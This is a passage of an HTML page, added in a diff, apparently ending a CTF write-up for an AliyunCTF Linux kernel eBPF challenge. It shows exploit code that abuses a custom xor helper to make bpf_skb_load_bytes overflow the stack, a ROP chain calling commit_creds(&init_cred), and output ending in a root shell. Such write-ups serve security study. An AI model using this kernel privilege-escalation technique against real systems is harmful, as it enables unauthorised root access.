+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_6, BPF_REG_3),
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// change the value in map
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_ST_MEM</span><span style="color:#c0c5ce;">(BPF_W, BPF_REG_10, -</span><span style="color:#d08770;">0x18</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">2025</span><span style="color:#c0c5ce;">^(</span><span style="color:#d08770;">0x80</span><span style="color:#c0c5ce;">)),
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_ST_MEM</span><span style="color:#c0c5ce;">(BPF_W, BPF_REG_10, -</span><span style="color:#d08770;">0x14</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_1, BPF_REG_10),
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_1, -</span><span style="color:#d08770;">0x18</span><span style="color:#c0c5ce;">),
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// set size
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_2, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">),
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_JMP | BPF_CALL, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, BPF_FUNC_aliyunctf_xor),
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// R1 = CTX
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_1, BPF_REG_8),
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_2, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// R3 = stack
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_3, BPF_REG_10),
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_3, -</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">),
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// load modified value as len
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_LDX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_7, BPF_REG_6, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_4, BPF_REG_7),
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_RAW_INSN</span><span style="color:#c0c5ce;">(BPF_JMP | BPF_CALL, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, BPF_FUNC_skb_load_bytes),
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">  };
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> data_buf[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">] = {};
+</span><span style="color:#c0c5ce;">  size_t *rop_chain = (size_t*)&amp;data_buf;
+</span><span style="color:#c0c5ce;">  rop_chain+=</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  *rop_chain++ = </span><span style="color:#d08770;">0xffffffff81142d79</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// pop rdi; ret;
+</span><span style="color:#c0c5ce;">  *rop_chain++ = </span><span style="color:#d08770;">0xffffffff82a52fa0</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// &amp;init_cred
+</span><span style="color:#c0c5ce;">  *rop_chain++ = </span><span style="color:#d08770;">0xffffffff810c19b0</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// commit_cred
+</span><span style="color:#c0c5ce;">  *rop_chain++ = </span><span style="color:#d08770;">0xffffffff8108d2f0</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// vfork
+</span><span style="color:#c0c5ce;">  
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_prog_skb_run</span><span style="color:#c0c5ce;">(prog, sizeof(prog)/sizeof(prog[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]), data_buf, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to run the eBPF prog!</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">  }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">get_root_shell</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">  
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">bash-5.2$ ./exp 
+</span><span style="color:#c0c5ce;">func#0 @0
+</span><span style="color:#c0c5ce;">0: R1=ctx(off=0,imm=0) R10=fp0
+</span><span style="color:#c0c5ce;">0: (bf) r8 = r1                       ; R1=ctx(off=0,imm=0) R8_w=ctx(off=0,imm=0)
+</span><span style="color:#c0c5ce;">1: (18) r9 = 0x0                      ; R9_w=map_ptr(off=0,ks=4,vs=8,imm=0)
+</span><span style="color:#c0c5ce;">3: (bf) r1 = r9                       ; R1_w=map_ptr(off=0,ks=4,vs=8,imm=0) R9_w=map_ptr(off=0,ks=4,vs=8,imm=0)
+</span><span style="color:#c0c5ce;">4: (bf) r2 = r10                      ; R2_w=fp0 R10=fp0
+</span><span style="color:#c0c5ce;">5: (07) r2 += -8                      ; R2_w=fp-8
+</span><span style="color:#c0c5ce;">6: (7a) *(u64 *)(r2 +0) = 0           ; R2_w=fp-8 fp-8_w=00000000
+</span><span style="color:#c0c5ce;">7: (85) call bpf_map_lookup_elem#1    ; R0_w=map_value_or_null(id=1,off=0,ks=4,vs=8,imm=0)
+</span><span style="color:#c0c5ce;">8: (55) if r0 != 0x0 goto pc+1        ; R0_w=P0
+</span><span style="color:#c0c5ce;">9: (95) exit
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">from 8 to 10: R0=map_value(off=0,ks=4,vs=8,imm=0) R8=ctx(off=0,imm=0) R9=map_ptr(off=0,ks=4,vs=8,imm=0) R10=fp0 fp-8=0000mmmm
+</span><span style="color:#c0c5ce;">10: R0=map_value(off=0,ks=4,vs=8,imm=0) R8=ctx(off=0,imm=0) R9=map_ptr(off=0,ks=4,vs=8,imm=0) R10=fp0 fp-8=0000mmmm
+</span><span style="color:#c0c5ce;">10: (bf) r3 = r0                      ; R0=map_value(off=0,ks=4,vs=8,imm=0) R3_w=map_value(off=0,ks=4,vs=8,imm=0)
+</span><span style="color:#c0c5ce;">11: (b7) r0 = 0                       ; R0_w=P0
+</span><span style="color:#c0c5ce;">12: (bf) r6 = r3                      ; R3_w=map_value(off=0,ks=4,vs=8,imm=0) R6_w=map_value(off=0,ks=4,vs=8,imm=0)
+</span><span style="color:#c0c5ce;">13: (62) *(u32 *)(r10 -24) = 1897     ; R10=fp0 fp-24=????mmmm
+</span><span style="color:#c0c5ce;">14: (62) *(u32 *)(r10 -20) = 0        ; R10=fp0 fp-24=0000mmmm
+</span><span style="color:#c0c5ce;">15: (bf) r1 = r10                     ; R1_w=fp0 R10=fp0
+</span><span style="color:#c0c5ce;">16: (07) r1 += -24                    ; R1_w=fp-24
+</span><span style="color:#c0c5ce;">17: (b7) r2 = 8                       ; R2_w=P8
+</span><span style="color:#c0c5ce;">18: (85) call bpf_aliyunctf_xor#212   ; R0_w=Pscalar()
+</span><span style="color:#c0c5ce;">19: (bf) r1 = r8                      ; R1_w=ctx(off=0,imm=0) R8=ctx(off=0,imm=0)
+</span><span style="color:#c0c5ce;">20: (b7) r2 = 0                       ; R2_w=P0
+</span><span style="color:#c0c5ce;">21: (bf) r3 = r10                     ; R3_w=fp0 R10=fp0
+</span><span style="color:#c0c5ce;">22: (07) r3 += -8                     ; R3_w=fp-8
+</span><span style="color:#c0c5ce;">23: (79) r4 = *(u64 *)(r6 +0)         ; R4_w=P1 R6_w=map_value(off=0,ks=4,vs=8,imm=0)
+</span><span style="color:#c0c5ce;">24: (85) call bpf_skb_load_bytes#26   ; R0=Pscalar() fp-8=0000mmmm
+</span><span style="color:#c0c5ce;">25: (95) exit
+</span><span style="color:#c0c5ce;">processed 25 insns (limit 1000000) max_states_per_insn 0 total_states 2 peak_states 2 mark_read 1
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">[*] Checking for root...
+</span><span style="color:#c0c5ce;">[+] Successful to get the root. 
+</span><span style="color:#c0c5ce;">[*] Execve root shell now...
+</span><span style="color:#c0c5ce;">/bin/sh: can&#39;t access tty; job control turned off
+</span><span style="color:#c0c5ce;">/ # id
+</span><span style="color:#c0c5ce;">uid=0(root) gid=0(root)
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ti-mu">题目</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#li-yong-fen-xi">利用分析</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
